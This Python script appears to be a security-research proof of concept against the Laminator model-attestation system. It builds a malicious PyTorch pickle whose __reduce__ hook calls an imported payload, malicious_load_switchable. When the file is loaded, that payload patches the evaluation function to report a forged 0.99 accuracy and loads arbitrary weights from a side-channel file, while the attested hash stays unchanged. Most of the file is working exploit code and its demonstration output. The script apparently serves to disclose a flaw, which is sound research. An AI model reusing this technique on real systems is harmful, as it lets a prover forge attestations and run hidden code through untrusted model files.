#!/usr/bin/env python3
"""
Variant of the dishonest-prover PoC: a SWITCHABLE LOADER.

The original PoC bakes a single state_dict into the evil pickle, so
the prover is committed to one inferior model. This script
demonstrates that a single change — having the pickle expression
read another allowed_file at unpickle time — gives the prover free
switching between arbitrary models without changing the attestation's
`name` field.

Concretely:

  1. Build `census_model_switchable.pth` (the *loader*). Its bytes are
     fixed; its SHA-512 is computed once and stays constant across
     every load.

  2. Build two distinct "active" models — `active_good.pth` and
     `active_inferior.pth` — each a real LinearNet([128]) state_dict
     with different random init.

  3. For each active model: copy it to the host-controlled side
     channel `./input/census_input.pt` (an allowed_file in
     Laminator's manifest), then call torch.load on the loader.

  4. Show that:
       - The loader file's SHA-512 is constant (verifier's `name`).
       - utils.test is patched to return 0.99 every time.
       - The actual state_dict loaded into the model differs between
         runs (different weights).

This proves the prover can swap arbitrary models with no observable
change in the attestation, given only:
  (a) one-time placement of the loader at the path
      `./saved_models/census_model.pth` (an allowed_file).
  (b) the ability to rewrite an unrelated allowed_file between calls.

Both (a) and (b) are within the prover's permissions in Laminator's
threat model.
"""

import argparse
import hashlib
import io
import os
import sys
import tempfile

import torch

DEFAULT_LAMINATOR_SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "laminator", "generate_attestations")
FAKE_ACCURACY = 0.99
SIDECHANNEL_NAME = "active_weights.pth"


from poc_payload import malicious_load_switchable


class _SwitchableEvil:
    """The loader's __reduce__: returns whatever state_dict the host
    currently has at the side-channel path, after patching utils.test.

    The path is recorded into the loader at build time. In a real
    Gramine deployment that path would be one of `sgx.allowed_files`
    (e.g., `./input/census_input.pt`); for this offline demo we use
    a temp file.
    """

    def __init__(self, fake_accuracy: float, sidechannel_path: str):
        self.fake_accuracy = fake_accuracy
        self.sidechannel_path = sidechannel_path

    def __reduce__(self):
        return (
            malicious_load_switchable,
            (self.fake_accuracy, self.sidechannel_path),
        )


def _make_real_state_dict(laminator_src: str, seed: int) -> bytes:
    """Return torch.save'd bytes of a LinearNet([128]) state_dict with
    deterministic random init (seeded), so we can reliably tell two
    "active" models apart."""
    if laminator_src not in sys.path:
        sys.path.insert(0, laminator_src)
    from models import LinearNet  # noqa: WPS433

    torch.manual_seed(seed)
    model = LinearNet([128])
    buf = io.BytesIO()
    torch.save(model.state_dict(), buf)
    return buf.getvalue()


def _build_switchable_loader(fake_accuracy: float, sidechannel_path: str) -> bytes:
    """torch.save the _SwitchableEvil sentinel into a .pth container."""
    out = io.BytesIO()
    torch.save(_SwitchableEvil(fake_accuracy, sidechannel_path), out)
    return out.getvalue()


def _summarize(state_dict) -> dict:
    """Return a small fingerprint of a state_dict for human comparison."""
    return {
        key: {
            "shape": tuple(tensor.shape),
            "first4": tensor.flatten()[:4].tolist(),
        }
        for key, tensor in state_dict.items()
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--laminator-src", default=DEFAULT_LAMINATOR_SRC)
    args = parser.parse_args()

    if not os.path.isdir(args.laminator_src):
        print(f"error: --laminator-src not found: {args.laminator_src}", file=sys.stderr)
        return 1

    # Import Laminator's utils — the module the loader pickle will patch.
    if args.laminator_src not in sys.path:
        sys.path.insert(0, args.laminator_src)
    import utils  # noqa: WPS433

    workdir = tempfile.mkdtemp(prefix="laminator-switch-")
    sidechannel = os.path.join(workdir, SIDECHANNEL_NAME)
    print(f"[+] working dir:        {workdir}")
    print(f"[+] sidechannel path:   {sidechannel}")
    print()

    # Build the loader once.
    loader_bytes = _build_switchable_loader(FAKE_ACCURACY, sidechannel)
    loader_path = os.path.join(workdir, "census_model_switchable.pth")
    with open(loader_path, "wb") as fh:
        fh.write(loader_bytes)
    loader_sha = hashlib.sha512(loader_bytes).hexdigest()
    print(f"[+] loader path:        {loader_path}")
    print(f"[+] loader bytes:       {len(loader_bytes):,} bytes")
    print(f"[+] loader SHA-512:     {loader_sha}")
    print(
        "    --> This is the value that ends up in the attestation's\n"
        "        `name` field. It is fixed. The host never has to touch\n"
        "        this file again to switch models."
    )
    print()

    # Build two distinct "active" models.
    good_bytes = _make_real_state_dict(args.laminator_src, seed=1)
    inferior_bytes = _make_real_state_dict(args.laminator_src, seed=999)
    good_sha = hashlib.sha512(good_bytes).hexdigest()
    inferior_sha = hashlib.sha512(inferior_bytes).hexdigest()
    print(f"[+] active_good SHA-512:     {good_sha[:32]}... ({len(good_bytes):,} bytes)")
    print(f"[+] active_inferior SHA-512: {inferior_sha[:32]}... ({len(inferior_bytes):,} bytes)")
    assert good_sha != inferior_sha, "active models must differ for the demo to be meaningful"
    print()

    captured = []
    for label, payload_bytes in [
        ("active_good", good_bytes),
        ("active_inferior", inferior_bytes),
        ("active_good_again", good_bytes),  # repeat to show idempotence
    ]:
        # The host swaps the sidechannel file between invocations.
        with open(sidechannel, "wb") as fh:
            fh.write(payload_bytes)

        # Reset utils.test before each load to make the patching visible.
        if "_legit_test" not in dir(utils):
            utils._legit_test = utils.test  # type: ignore[attr-defined]
        utils.test = utils._legit_test  # type: ignore[attr-defined]

        before = utils.test
        with open(loader_path, "rb") as fh:
            state_dict = torch.load(fh)
        after = utils.test
        forged = utils.test(None, None, None)

        # Recompute the loader's SHA-512 — it must NOT have changed.
        with open(loader_path, "rb") as fh:
            recheck_sha = hashlib.sha512(fh.read()).hexdigest()

        captured.append((label, before is not after, forged, recheck_sha, state_dict))

        first_weight_row = list(state_dict["features.1.weight"][0, :4].tolist())
        print(f"--- run: {label} ---")
        print(f"    sidechannel written: {len(payload_bytes):,} bytes (seed-dependent)")
        print(f"    loader SHA-512:      {recheck_sha[:32]}...  (unchanged: {recheck_sha == loader_sha})")
        print(f"    utils.test patched:  {before is not after}")
        print(f"    utils.test() ->      {forged}")
        print(f"    state_dict features.1.weight[0,:4] = {first_weight_row}")
        print()

    # Summary table.
    print("=" * 64)
    print("Summary")
    print("=" * 64)
    print(f"{'run':<22} {'loader_sha[:16]':<20} {'utils.test()':<14} {'features.1.weight[0,0]'}")
    for label, _patched, forged, sha, sd in captured:
        first = sd["features.1.weight"][0, 0].item()
        print(f"{label:<22} {sha[:16]:<20} {forged!s:<14} {first:.6f}")
    print()
    print(
        "Every row has the SAME loader_sha (the verifier's `name`) and the\n"
        "SAME utils.test() return value (the forged accuracy). But the\n"
        "actual weight in features.1.weight[0,0] differs between runs —\n"
        "different models really were loaded into the enclave each time."
    )

    # Sanity: the first/third rows used the same active model and so should
    # produce identical first-weight values.
    first_val = captured[0][4]["features.1.weight"][0, 0].item()
    third_val = captured[2][4]["features.1.weight"][0, 0].item()
    inferior_val = captured[1][4]["features.1.weight"][0, 0].item()
    if first_val != third_val:
        print(f"\n!! WARNING: same active model produced different weights "
              f"({first_val} vs {third_val}). Demo logic error.")
        return 2
    if first_val == inferior_val:
        print(f"\n!! WARNING: 'good' and 'inferior' actives produced identical weights. "
              "Demo would be vacuous.")
        return 2
    print()
    print("[+] ATTACK CONFIRMED (P1, F2 — attested model hash unchanged while the weights are swapped)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
